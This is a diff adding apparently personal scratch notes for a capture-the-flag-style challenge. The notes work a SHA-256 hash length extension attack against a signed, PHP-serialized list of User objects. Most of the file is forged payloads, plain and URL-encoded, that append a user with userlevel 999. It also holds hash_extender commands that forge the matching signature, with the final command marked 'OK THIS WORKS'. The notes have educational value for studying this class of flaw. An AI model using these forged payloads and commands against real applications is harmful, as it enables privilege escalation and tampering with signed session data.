@@ -1,0 +1,70 @@
+dc4e78c2835097b33bbb85a47907ef8a76b92b6e46700971e7a74fd50165d93d
+80d41cae8a47e87ff3a6ce45ac901066e0a6be9eb3f575b72ed1b960c8eb16fc
+
+OLDDDDDD>>>>>>>>>>>>>>>>>>>>>>>
+O:4:"User":2:{s:15:"Useruserlevel";i:10;s:14:"Userusername";s:8:"John+Doe";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:33;s:14:"Userusername";s:12:"Peter+Parker";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:87;s:14:"Userusername";s:11:"Gabe+Newell";}\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x98<x>O:4:"User":2:{s:15:"Useruserlevel";i:999;s:14:"Userusername";s:11:"Gaba+Newall";}
+
+O:4:"User":2:{s:15:"Useruserlevel";i:10;s:14:"Userusername";s:8:"John+Doe";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:33;s:14:"Userusername";s:12:"Peter+Parker";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:87;s:14:"Userusername";s:11:"Gabe+Newell";}\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x08\x98<x>O:4:"User":2:{s:15:"Useruserlevel";i:999;s:14:"Userusername";s:11:"Gaba+Nawell";}
+
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D%5Cx80%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx00%5Cx08%5Cx98%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A999%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Newall%22%3B%7D
+
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%08%98%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A999%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Nawell%22%3B%7D
+
+
+<<< NEW AND IMPROVED >>>
+
+a8de60ad4dcf8e1219678bf6a07c12d207f305713c23226ca341f4e102a6dc12
+
+O:4:User:2:{s:15:Useruserlevel;i:10;s:14:Userusername;s:8:John+Doe;}<x>O:4:User:2:{s:15:Useruserlevel;i:33;s:14:Userusername;s:12:Peter+Parker;}<x>O:4:User:2:{s:15:Useruserlevel;i:87;s:14:Userusername;s:11:Gabe+Newell;}\x80\x00\x00\x07\xd8<x>O:4:User:2:{s:15:Useruserlevel;i:999;s:14:Userusername;s:11:Gaba+Nawell;}
+
+
+<<< 11am, friday >>>
+
+80d41cae8a47e87ff3a6ce45ac901066e0a6be9eb3f575b72ed1b960c8eb16fc
+
+
+<<< 3pm, friday >>>
+
+458213aea4fdc24076097ded54492d19f733e9b5e16791e8957f45d337701ae9
+
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D
+
+-------------------------- HASHPUMP -------------------------
+
+O:4:"User":2:{s:15:"^@User^@userlevel";i:10;s:14:"^@User^@username";s:8:"John+Doe";}<x>O:4:"User":2:{s:15:"^@User^@userlevel";i:33;s:14:"^@User^@username";s:12:"Peter+Parker";}<x>O:4:"User":2:{s:15:"^@User^@userlevel";i:87;s:14:"^@User^@username";s:11:"Gabe+Newell";}
+
+<x>O:4:"User":2:{s:15:"Useruserlevel";i:87;s:14:"Userusername";s:11:"Gaba+Newell";}
+
+-------------------------- RESULT -------------------------
+
+83516229de1bb17dcd6d114274d360abba513c631b06c5192c5d09f86caf5f5b
+
+O:4:"User":2:{s:15:"^@User^@userlevel";i:10;s:14:"^@User^@username";s:8:"John+Doe";}<x>O:4:"User":2:{s:15:"^@User^@userlevel";i:33;s:14:"^@User^@username";s:12:"Peter+Parker";}<x>O:4:"User":2:{s:15:"^@User^@userlevel";i:87;s:14:"^@User^@username";s:11:"Gabe+Newell";}\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x09X<x>O:4:"User":2:{s:15:"^@User^@userlevel";i:87;s:14:"^@User^@username";s:11:"Gaba+Newell";}
+
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%5E%40User%5E%40userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%5E%40User%5E%40username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%5E%40User%5E%40userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%5E%40User%5E%40username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%5E%40User%5E%40userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%5E%40User%5E%40username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%09X%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%5E%40User%5E%40userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%5E%40User%5E%40username%22%3Bs%3A11%3A%22Gaba+Newell%22%3B%7D
+
+O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%5E%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D%80%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%00%09X%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Newell%22%3B%7D
+
+
+
+O:4:"User":2:{s:15:"Useruserlevel";i:10;s:14:"Userusername";s:8:"John+Doe";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:33;s:14:"Userusername";s:12:"Peter+Parker";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:87;s:14:"Userusername";s:11:"Gabe+Newell";}<x>O:4:"User":2:{s:15:"Useruserlevel";i:87;s:14:"Userusername";s:11:"Gaba+Newell";}
+
+./hash_extender -s '458213aea4fdc24076097ded54492d19f733e9b5e16791e8957f45d337701ae9' --data 'O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D' -a '' -l 32 --data-format='html'
+
+
+
+./hash_extender -s '458213aea4fdc24076097ded54492d19f733e9b5e16791e8957f45d337701ae9' --data 'O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D' -a '%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A999%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Newell%22%3B%7D' -l 32 --data-format=html --out-data-format=html
+
+./hash_extender -s '458213aea4fdc24076097ded54492d19f733e9b5e16791e8957f45d337701ae9' --data 'O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D' -a '%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A999%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Newell%22%3B%7D' -l 32 --data-format=html --out-data-format=html -append-format=html
+
+
+
+<<< OK THIS WORKS >>>
+
+./hash_extender -s '458213aea4fdc24076097ded54492d19f733e9b5e16791e8957f45d337701ae9' --data 'O%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A10%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A8%3A%22John+Doe%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A33%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A12%3A%22Peter+Parker%22%3B%7D%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A87%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gabe+Newell%22%3B%7D' -a '%3Cx%3EO%3A4%3A%22User%22%3A2%3A%7Bs%3A15%3A%22%00User%00userlevel%22%3Bi%3A999%3Bs%3A14%3A%22%00User%00username%22%3Bs%3A11%3A%22Gaba+Newell%22%3B%7D' -l 32 --data-format=html --out-data-format=html -append-format=html
+
+
+
+
+
+
